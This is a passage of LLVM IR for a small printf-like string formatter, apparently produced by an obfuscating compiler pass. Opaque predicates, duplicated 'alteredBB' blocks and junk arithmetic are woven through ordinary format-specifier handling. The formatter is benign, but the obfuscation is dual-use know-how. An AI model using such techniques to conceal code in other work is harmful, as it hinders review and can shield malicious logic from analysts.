  br label %77

; <label>:77:                                     ; preds = %82, %76
  %78 = load i8*, i8** %5, align 8
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = icmp eq i32 %80, 48
  br i1 %81, label %82, label %87

; <label>:82:                                     ; preds = %77
  %83 = load i8*, i8** %5, align 8
  %84 = getelementptr inbounds i8, i8* %83, i32 1
  store i8* %84, i8** %5, align 8
  %85 = load i32, i32* %8, align 4
  %86 = or i32 %85, 2
  store i32 %86, i32* %8, align 4
  br label %77

; <label>:87:                                     ; preds = %77
  br label %88

; <label>:88:                                     ; preds = %125, %87
  %89 = load i32, i32* @x.25
  %90 = load i32, i32* @y.26
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %88
  %97 = load i8*, i8** %5, align 8
  %98 = load i8, i8* %97, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp sge i32 %99, 48
  %101 = load i32, i32* @x.25
  %102 = load i32, i32* @y.26
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %100, label %109, label %114

; <label>:109:                                    ; preds = %originalBBpart28
  %110 = load i8*, i8** %5, align 8
  %111 = load i8, i8* %110, align 1
  %112 = zext i8 %111 to i32
  %113 = icmp sle i32 %112, 57
  br label %114

; <label>:114:                                    ; preds = %109, %originalBBpart28
  %115 = phi i1 [ false, %originalBBpart28 ], [ %113, %109 ]
  br i1 %115, label %116, label %128

; <label>:116:                                    ; preds = %114
  %117 = load i32, i32* %7, align 4
  %118 = mul nsw i32 %117, 10
  store i32 %118, i32* %7, align 4
  %119 = load i8*, i8** %5, align 8
  %120 = load i8, i8* %119, align 1
  %121 = zext i8 %120 to i32
  %122 = sub nsw i32 %121, 48
  %123 = load i32, i32* %7, align 4
  %124 = add nsw i32 %123, %122
  store i32 %124, i32* %7, align 4
  br label %125

; <label>:125:                                    ; preds = %116
  %126 = load i8*, i8** %5, align 8
  %127 = getelementptr inbounds i8, i8* %126, i32 1
  store i8* %127, i8** %5, align 8
  br label %88

; <label>:128:                                    ; preds = %114
  %129 = load i8*, i8** %5, align 8
  %130 = load i8, i8* %129, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp eq i32 %131, 115
  br i1 %132, label %133, label %199

; <label>:133:                                    ; preds = %128
  %134 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %135 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %134, i32 0, i32 0
  %136 = load i32, i32* %135, align 8
  %137 = icmp ule i32 %136, 40
  br i1 %137, label %138, label %144

; <label>:138:                                    ; preds = %133
  %139 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %134, i32 0, i32 3
  %140 = load i8*, i8** %139, align 8
  %141 = getelementptr i8, i8* %140, i32 %136
  %142 = bitcast i8* %141 to i32*
  %143 = add i32 %136, 8
  store i32 %143, i32* %135, align 8
  br label %165

; <label>:144:                                    ; preds = %133
  %145 = load i32, i32* @x.25
  %146 = load i32, i32* @y.26
  %147 = sub i32 %145, 1
  %148 = mul i32 %145, %147
  %149 = urem i32 %148, 2
  %150 = icmp eq i32 %149, 0
  %151 = icmp slt i32 %146, 10
  %152 = or i1 %150, %151
  br i1 %152, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %144
  %153 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %134, i32 0, i32 2
  %154 = load i8*, i8** %153, align 8
  %155 = bitcast i8* %154 to i32*
  %156 = getelementptr i8, i8* %154, i32 8
  store i8* %156, i8** %153, align 8
  %157 = load i32, i32* @x.25
  %158 = load i32, i32* @y.26
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %165

; <label>:165:                                    ; preds = %originalBBpart212, %138
  %166 = phi i32* [ %142, %138 ], [ %155, %originalBBpart212 ]
  %167 = load i32, i32* %166, align 4
  %168 = sext i32 %167 to i64
  %169 = inttoptr i64 %168 to i8*
  store i8* %169, i8** %11, align 8
  %170 = load i8**, i8*** %4, align 8
  %171 = load i8*, i8** %11, align 8
  %172 = icmp ne i8* %171, null
  br i1 %172, label %173, label %191

; <label>:173:                                    ; preds = %165
  %174 = load i32, i32* @x.25
  %175 = load i32, i32* @y.26
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %173
  %182 = load i8*, i8** %11, align 8
  %183 = load i32, i32* @x.25
  %184 = load i32, i32* @y.26
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %192

; <label>:191:                                    ; preds = %165
  br label %192

; <label>:192:                                    ; preds = %191, %originalBBpart216
  %193 = phi i8* [ %182, %originalBBpart216 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.133, i32 0, i32 0), %191 ]
  %194 = load i32, i32* %7, align 4
  %195 = load i32, i32* %8, align 4
  %196 = call i32 @prints(i8** %170, i8* %193, i32 %194, i32 %195)
  %197 = load i32, i32* %9, align 4
  %198 = add nsw i32 %197, %196
  store i32 %198, i32* %9, align 4
  br label %507

; <label>:199:                                    ; preds = %128
  %200 = load i8*, i8** %5, align 8
  %201 = load i8, i8* %200, align 1
  %202 = zext i8 %201 to i32
  %203 = icmp eq i32 %202, 100
  br i1 %203, label %204, label %245

; <label>:204:                                    ; preds = %199
  %205 = load i8**, i8*** %4, align 8
  %206 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %207 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %206, i32 0, i32 0
  %208 = load i32, i32* %207, align 8
  %209 = icmp ule i32 %208, 40
  br i1 %209, label %210, label %216

; <label>:210:                                    ; preds = %204
  %211 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %206, i32 0, i32 3
  %212 = load i8*, i8** %211, align 8
  %213 = getelementptr i8, i8* %212, i32 %208
  %214 = bitcast i8* %213 to i32*
  %215 = add i32 %208, 8
  store i32 %215, i32* %207, align 8
  br label %221

; <label>:216:                                    ; preds = %204
  %217 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %206, i32 0, i32 2
  %218 = load i8*, i8** %217, align 8
  %219 = bitcast i8* %218 to i32*
  %220 = getelementptr i8, i8* %218, i32 8
  store i8* %220, i8** %217, align 8
  br label %221

; <label>:221:                                    ; preds = %216, %210
  %222 = phi i32* [ %214, %210 ], [ %219, %216 ]
  %223 = load i32, i32* @x.25
  %224 = load i32, i32* @y.26
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %221
  %231 = load i32, i32* %222, align 4
  %232 = load i32, i32* %7, align 4
  %233 = load i32, i32* %8, align 4
  %234 = call i32 @printi(i8** %205, i32 %231, i32 10, i32 1, i32 %232, i32 %233, i32 97)
  %235 = load i32, i32* %9, align 4
  %236 = add nsw i32 %235, %234
  store i32 %236, i32* %9, align 4
  %237 = load i32, i32* @x.25
  %238 = load i32, i32* @y.26
  %239 = sub i32 %237, 1
  %240 = mul i32 %237, %239
  %241 = urem i32 %240, 2
  %242 = icmp eq i32 %241, 0
  %243 = icmp slt i32 %238, 10
  %244 = or i1 %242, %243
  br i1 %244, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %507

; <label>:245:                                    ; preds = %199
  %246 = load i8*, i8** %5, align 8
  %247 = load i8, i8* %246, align 1
  %248 = zext i8 %247 to i32
  %249 = icmp eq i32 %248, 120
  br i1 %249, label %250, label %307

; <label>:250:                                    ; preds = %245
  %251 = load i32, i32* @x.25
  %252 = load i32, i32* @y.26
  %253 = sub i32 %251, 1
  %254 = mul i32 %251, %253
  %255 = urem i32 %254, 2
  %256 = icmp eq i32 %255, 0
  %257 = icmp slt i32 %252, 10
  %258 = or i1 %256, %257
  br i1 %258, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %250
  %259 = load i8**, i8*** %4, align 8
  %260 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %261 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %260, i32 0, i32 0
  %262 = load i32, i32* %261, align 8
  %263 = icmp ule i32 %262, 40
  %264 = load i32, i32* @x.25
  %265 = load i32, i32* @y.26
  %266 = sub i32 %264, 1
  %267 = mul i32 %264, %266
  %268 = urem i32 %267, 2
  %269 = icmp eq i32 %268, 0
  %270 = icmp slt i32 %265, 10
  %271 = or i1 %269, %270
  br i1 %271, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %263, label %272, label %278

; <label>:272:                                    ; preds = %originalBBpart224
  %273 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %260, i32 0, i32 3
  %274 = load i8*, i8** %273, align 8
  %275 = getelementptr i8, i8* %274, i32 %262
  %276 = bitcast i8* %275 to i32*
  %277 = add i32 %262, 8
  store i32 %277, i32* %261, align 8
  br label %299

; <label>:278:                                    ; preds = %originalBBpart224
  %279 = load i32, i32* @x.25
  %280 = load i32, i32* @y.26
  %281 = sub i32 %279, 1
  %282 = mul i32 %279, %281
  %283 = urem i32 %282, 2
  %284 = icmp eq i32 %283, 0
  %285 = icmp slt i32 %280, 10
  %286 = or i1 %284, %285
  br i1 %286, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %278
  %287 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %260, i32 0, i32 2
  %288 = load i8*, i8** %287, align 8
  %289 = bitcast i8* %288 to i32*
  %290 = getelementptr i8, i8* %288, i32 8
  store i8* %290, i8** %287, align 8
  %291 = load i32, i32* @x.25
  %292 = load i32, i32* @y.26
  %293 = sub i32 %291, 1
  %294 = mul i32 %291, %293
  %295 = urem i32 %294, 2
  %296 = icmp eq i32 %295, 0
  %297 = icmp slt i32 %292, 10
  %298 = or i1 %296, %297
  br i1 %298, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %299

; <label>:299:                                    ; preds = %originalBBpart228, %272
  %300 = phi i32* [ %276, %272 ], [ %289, %originalBBpart228 ]
  %301 = load i32, i32* %300, align 4
  %302 = load i32, i32* %7, align 4
  %303 = load i32, i32* %8, align 4
  %304 = call i32 @printi(i8** %259, i32 %301, i32 16, i32 0, i32 %302, i32 %303, i32 97)
  %305 = load i32, i32* %9, align 4
  %306 = add nsw i32 %305, %304
  store i32 %306, i32* %9, align 4
  br label %507

; <label>:307:                                    ; preds = %245
  %308 = load i8*, i8** %5, align 8
  %309 = load i8, i8* %308, align 1
  %310 = zext i8 %309 to i32
  %311 = icmp eq i32 %310, 88
  br i1 %311, label %312, label %353

; <label>:312:                                    ; preds = %307
  %313 = load i32, i32* @x.25
  %314 = load i32, i32* @y.26
  %315 = sub i32 %313, 1
  %316 = mul i32 %313, %315
  %317 = urem i32 %316, 2
  %318 = icmp eq i32 %317, 0
  %319 = icmp slt i32 %314, 10
  %320 = or i1 %318, %319
  br i1 %320, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %312
  %321 = load i8**, i8*** %4, align 8
  %322 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %323 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %322, i32 0, i32 0
  %324 = load i32, i32* %323, align 8
  %325 = icmp ule i32 %324, 40
  %326 = load i32, i32* @x.25
  %327 = load i32, i32* @y.26
  %328 = sub i32 %326, 1
  %329 = mul i32 %326, %328
  %330 = urem i32 %329, 2
  %331 = icmp eq i32 %330, 0
  %332 = icmp slt i32 %327, 10
  %333 = or i1 %331, %332
  br i1 %333, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %325, label %334, label %340

; <label>:334:                                    ; preds = %originalBBpart232
  %335 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %322, i32 0, i32 3
  %336 = load i8*, i8** %335, align 8
  %337 = getelementptr i8, i8* %336, i32 %324
  %338 = bitcast i8* %337 to i32*
  %339 = add i32 %324, 8
  store i32 %339, i32* %323, align 8
  br label %345

; <label>:340:                                    ; preds = %originalBBpart232
  %341 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %322, i32 0, i32 2
  %342 = load i8*, i8** %341, align 8
  %343 = bitcast i8* %342 to i32*
  %344 = getelementptr i8, i8* %342, i32 8
  store i8* %344, i8** %341, align 8
  br label %345

; <label>:345:                                    ; preds = %340, %334
  %346 = phi i32* [ %338, %334 ], [ %343, %340 ]
  %347 = load i32, i32* %346, align 4
  %348 = load i32, i32* %7, align 4
  %349 = load i32, i32* %8, align 4
  %350 = call i32 @printi(i8** %321, i32 %347, i32 16, i32 0, i32 %348, i32 %349, i32 65)
  %351 = load i32, i32* %9, align 4
  %352 = add nsw i32 %351, %350
  store i32 %352, i32* %9, align 4
  br label %507

; <label>:353:                                    ; preds = %307
  %354 = load i32, i32* @x.25
  %355 = load i32, i32* @y.26
  %356 = sub i32 %354, 1
  %357 = mul i32 %354, %356
  %358 = urem i32 %357, 2
  %359 = icmp eq i32 %358, 0
  %360 = icmp slt i32 %355, 10
  %361 = or i1 %359, %360
  br i1 %361, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %353
  %362 = load i8*, i8** %5, align 8
  %363 = load i8, i8* %362, align 1
  %364 = zext i8 %363 to i32
  %365 = icmp eq i32 %364, 117
  %366 = load i32, i32* @x.25
  %367 = load i32, i32* @y.26
  %368 = sub i32 %366, 1
  %369 = mul i32 %366, %368
  %370 = urem i32 %369, 2
  %371 = icmp eq i32 %370, 0
  %372 = icmp slt i32 %367, 10
  %373 = or i1 %371, %372
  br i1 %373, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %365, label %374, label %399

; <label>:374:                                    ; preds = %originalBBpart236
  %375 = load i8**, i8*** %4, align 8
  %376 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %377 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %376, i32 0, i32 0
  %378 = load i32, i32* %377, align 8
  %379 = icmp ule i32 %378, 40
  br i1 %379, label %380, label %386

; <label>:380:                                    ; preds = %374
  %381 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %376, i32 0, i32 3
  %382 = load i8*, i8** %381, align 8
  %383 = getelementptr i8, i8* %382, i32 %378
  %384 = bitcast i8* %383 to i32*
  %385 = add i32 %378, 8
  store i32 %385, i32* %377, align 8
  br label %391

; <label>:386:                                    ; preds = %374
  %387 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %376, i32 0, i32 2
  %388 = load i8*, i8** %387, align 8
  %389 = bitcast i8* %388 to i32*
  %390 = getelementptr i8, i8* %388, i32 8
  store i8* %390, i8** %387, align 8
  br label %391

; <label>:391:                                    ; preds = %386, %380
  %392 = phi i32* [ %384, %380 ], [ %389, %386 ]
  %393 = load i32, i32* %392, align 4
  %394 = load i32, i32* %7, align 4
  %395 = load i32, i32* %8, align 4
  %396 = call i32 @printi(i8** %375, i32 %393, i32 10, i32 0, i32 %394, i32 %395, i32 97)
  %397 = load i32, i32* %9, align 4
  %398 = add nsw i32 %397, %396
  store i32 %398, i32* %9, align 4
  br label %507

; <label>:399:                                    ; preds = %originalBBpart236
  %400 = load i32, i32* @x.25
  %401 = load i32, i32* @y.26
  %402 = sub i32 %400, 1
  %403 = mul i32 %400, %402
  %404 = urem i32 %403, 2
  %405 = icmp eq i32 %404, 0
  %406 = icmp slt i32 %401, 10
  %407 = or i1 %405, %406
  br i1 %407, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %399
  %408 = load i8*, i8** %5, align 8
  %409 = load i8, i8* %408, align 1
  %410 = zext i8 %409 to i32
  %411 = icmp eq i32 %410, 99
  %412 = load i32, i32* @x.25
  %413 = load i32, i32* @y.26
  %414 = sub i32 %412, 1
  %415 = mul i32 %412, %414
  %416 = urem i32 %415, 2
  %417 = icmp eq i32 %416, 0
  %418 = icmp slt i32 %413, 10
  %419 = or i1 %417, %418
  br i1 %419, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %411, label %420, label %465

; <label>:420:                                    ; preds = %originalBBpart240
  %421 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %422 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %421, i32 0, i32 0
  %423 = load i32, i32* %422, align 8
  %424 = icmp ule i32 %423, 40
  br i1 %424, label %425, label %447

; <label>:425:                                    ; preds = %420
  %426 = load i32, i32* @x.25
  %427 = load i32, i32* @y.26
  %428 = sub i32 %426, 1
  %429 = mul i32 %426, %428
  %430 = urem i32 %429, 2
  %431 = icmp eq i32 %430, 0
  %432 = icmp slt i32 %427, 10
  %433 = or i1 %431, %432
  br i1 %433, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %425
  %434 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %421, i32 0, i32 3
  %435 = load i8*, i8** %434, align 8
  %436 = getelementptr i8, i8* %435, i32 %423
  %437 = bitcast i8* %436 to i32*
  %438 = add i32 %423, 8
  store i32 %438, i32* %422, align 8
  %439 = load i32, i32* @x.25
  %440 = load i32, i32* @y.26
  %441 = sub i32 %439, 1
  %442 = mul i32 %439, %441
  %443 = urem i32 %442, 2
  %444 = icmp eq i32 %443, 0
  %445 = icmp slt i32 %440, 10
  %446 = or i1 %444, %445
  br i1 %446, label %originalBBpart260, label %originalBB42alteredBB

originalBBpart260:                                ; preds = %originalBB42
  br label %452

; <label>:447:                                    ; preds = %420
  %448 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %421, i32 0, i32 2
  %449 = load i8*, i8** %448, align 8
  %450 = bitcast i8* %449 to i32*
  %451 = getelementptr i8, i8* %449, i32 8
  store i8* %451, i8** %448, align 8
  br label %452

; <label>:452:                                    ; preds = %447, %originalBBpart260
  %453 = phi i32* [ %437, %originalBBpart260 ], [ %450, %447 ]
  %454 = load i32, i32* %453, align 4
  %455 = trunc i32 %454 to i8
  %456 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %455, i8* %456, align 1
  %457 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %457, align 1
  %458 = load i8**, i8*** %4, align 8
  %459 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %460 = load i32, i32* %7, align 4
  %461 = load i32, i32* %8, align 4
  %462 = call i32 @prints(i8** %458, i8* %459, i32 %460, i32 %461)
  %463 = load i32, i32* %9, align 4
  %464 = add nsw i32 %463, %462
  store i32 %464, i32* %9, align 4
  br label %507

; <label>:465:                                    ; preds = %originalBBpart240
  br label %506

; <label>:466:                                    ; preds = %17
  %467 = load i32, i32* @x.25
  %468 = load i32, i32* @y.26
  %469 = sub i32 %467, 1
  %470 = mul i32 %467, %469
  %471 = urem i32 %470, 2
  %472 = icmp eq i32 %471, 0
  %473 = icmp slt i32 %468, 10
  %474 = or i1 %472, %473
  br i1 %474, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %466
  %475 = load i32, i32* @x.25
  %476 = load i32, i32* @y.26
  %477 = sub i32 %475, 1
  %478 = mul i32 %475, %477
  %479 = urem i32 %478, 2
  %480 = icmp eq i32 %479, 0
  %481 = icmp slt i32 %476, 10
  %482 = or i1 %480, %481
  br i1 %482, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br label %483

; <label>:483:                                    ; preds = %originalBBpart264, %51
  %484 = load i32, i32* @x.25
  %485 = load i32, i32* @y.26
  %486 = sub i32 %484, 1
  %487 = mul i32 %484, %486
  %488 = urem i32 %487, 2
  %489 = icmp eq i32 %488, 0
  %490 = icmp slt i32 %485, 10
  %491 = or i1 %489, %490
  br i1 %491, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %483
  %492 = load i8**, i8*** %4, align 8
  %493 = load i8*, i8** %5, align 8
  %494 = load i8, i8* %493, align 1
  %495 = zext i8 %494 to i32
  call void @printchar(i8** %492, i32 %495)
  %496 = load i32, i32* %9, align 4
  %497 = add nsw i32 %496, 1
  store i32 %497, i32* %9, align 4
  %498 = load i32, i32* @x.25
  %499 = load i32, i32* @y.26
  %500 = sub i32 %498, 1
  %501 = mul i32 %498, %500
  %502 = urem i32 %501, 2
  %503 = icmp eq i32 %502, 0
  %504 = icmp slt i32 %499, 10
  %505 = or i1 %503, %504
  br i1 %505, label %originalBBpart280, label %originalBB66alteredBB

originalBBpart280:                                ; preds = %originalBB66
  br label %506

; <label>:506:                                    ; preds = %originalBBpart280, %465
  br label %507

; <label>:507:                                    ; preds = %506, %452, %391, %345, %299, %originalBBpart220, %192
  %508 = load i8*, i8** %5, align 8
  %509 = getelementptr inbounds i8, i8* %508, i32 1
  store i8* %509, i8** %5, align 8
  br label %12

; <label>:510:                                    ; preds = %originalBBpart2, %12
  %511 = load i8**, i8*** %4, align 8
  %512 = icmp ne i8** %511, null
  br i1 %512, label %513, label %516

; <label>:513:                                    ; preds = %510
  %514 = load i8**, i8*** %4, align 8
  %515 = load i8*, i8** %514, align 8
  store i8 0, i8* %515, align 1
  br label %516

; <label>:516:                                    ; preds = %513, %510
  %517 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %518 = bitcast %struct.__va_list_tag* %517 to i8*
  call void @llvm.va_end(i8* %518)
  %519 = load i32, i32* %9, align 4
  ret i32 %519

originalBBalteredBB:                              ; preds = %originalBB, %29
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %57
  %520 = load i8*, i8** %5, align 8
  %521 = getelementptr inbounds i8, i8* %520, i32 1
  store i8* %521, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %88
  %522 = load i8*, i8** %5, align 8
  %523 = load i8, i8* %522, align 1
  %524 = zext i8 %523 to i32
  %525 = icmp sge i32 %524, 48
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %144
  %526 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %134, i32 0, i32 2
  %527 = load i8*, i8** %526, align 8
  %528 = bitcast i8* %527 to i32*
  %529 = getelementptr i8, i8* %527, i32 8
  store i8* %529, i8** %526, align 8
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %173
  %530 = load i8*, i8** %11, align 8
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %221
  %531 = load i32, i32* %222, align 4
  %532 = load i32, i32* %7, align 4
  %533 = load i32, i32* %8, align 4
  %534 = call i32 @printi(i8** %205, i32 %531, i32 10, i32 1, i32 %532, i32 %533, i32 97)
  %535 = load i32, i32* %9, align 4
  %_ = sub i32 0, %535
  %gen = add i32 %_, %534
  %536 = add nsw i32 %535, %534
  store i32 %536, i32* %9, align 4
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %250
  %537 = load i8**, i8*** %4, align 8
  %538 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %539 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %538, i32 0, i32 0
  %540 = load i32, i32* %539, align 8
  %541 = icmp ule i32 %540, 40
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %278
  %542 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %260, i32 0, i32 2
  %543 = load i8*, i8** %542, align 8
  %544 = bitcast i8* %543 to i32*
  %545 = getelementptr i8, i8* %543, i32 8
  store i8* %545, i8** %542, align 8
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %312
  %546 = load i8**, i8*** %4, align 8
  %547 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %548 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %547, i32 0, i32 0
  %549 = load i32, i32* %548, align 8
  %550 = icmp ule i32 %549, 40
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %353
  %551 = load i8*, i8** %5, align 8
  %552 = load i8, i8* %551, align 1
  %553 = zext i8 %552 to i32
  %554 = icmp eq i32 %553, 117
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %399
  %555 = load i8*, i8** %5, align 8
  %556 = load i8, i8* %555, align 1
  %557 = zext i8 %556 to i32
  %558 = icmp eq i32 %557, 99
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %425
  %559 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %421, i32 0, i32 3
  %560 = load i8*, i8** %559, align 8
  %561 = getelementptr i8, i8* %560, i32 %423
  %562 = bitcast i8* %561 to i32*
  %_43 = sub i32 %423, 8
  %gen44 = mul i32 %_43, 8
  %_45 = sub i32 %423, 8
  %gen46 = mul i32 %_45, 8
  %_47 = sub i32 0, %423
  %gen48 = add i32 %_47, 8
  %_49 = sub i32 %423, 8
  %gen50 = mul i32 %_49, 8
  %_51 = sub i32 %423, 8
  %gen52 = mul i32 %_51, 8
  %_53 = sub i32 0, %423
  %gen54 = add i32 %_53, 8
  %_55 = sub i32 %423, 8
  %gen56 = mul i32 %_55, 8
  %_57 = sub i32 %423, 8
  %gen58 = mul i32 %_57, 8
  %563 = add i32 %423, 8
  store i32 %563, i32* %422, align 8
  br label %originalBB42

originalBB62alteredBB:                            ; preds = %originalBB62, %466
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %483
  %564 = load i8**, i8*** %4, align 8
  %565 = load i8*, i8** %5, align 8
  %566 = load i8, i8* %565, align 1
  %567 = zext i8 %566 to i32
  call void @printchar(i8** %564, i32 %567)
  %568 = load i32, i32* %9, align 4
  %_67 = sub i32 %568, 1
  %gen68 = mul i32 %_67, 1
  %_69 = sub i32 0, %568
  %gen70 = add i32 %_69, 1
  %_71 = sub i32 0, %568
  %gen72 = add i32 %_71, 1
  %_73 = shl i32 %568, 1
  %_74 = shl i32 %568, 1
  %_75 = sub i32 %568, 1
  %gen76 = mul i32 %_75, 1
  %_77 = sub i32 0, %568
  %gen78 = add i32 %_77, 1
  %569 = add nsw i32 %568, 1
  store i32 %569, i32* %9, align 4
  br label %originalBB66
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = load i32, i32* @x.27
  %6 = load i32, i32* @y.28
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8**, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  store i8** %0, i8*** %13, align 8
  store i8* %1, i8** %14, align 8
  store i32 %2, i32* %15, align 4
  store i32 %3, i32* %16, align 4
  store i32 0, i32* %17, align 4
  store i32 32, i32* %18, align 4
  %21 = load i32, i32* %15, align 4
  %22 = icmp sgt i32 %21, 0
  %23 = load i32, i32* @x.27
  %24 = load i32, i32* @y.28
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %122

; <label>:31:                                     ; preds = %originalBBpart2
  store i32 0, i32* %19, align 4
  %32 = load i8*, i8** %14, align 8
  store i8* %32, i8** %20, align 8
  br label %33

; <label>:33:                                     ; preds = %40, %31
  %34 = load i8*, i8** %20, align 8
  %35 = load i8, i8* %34, align 1
  %36 = icmp ne i8 %35, 0
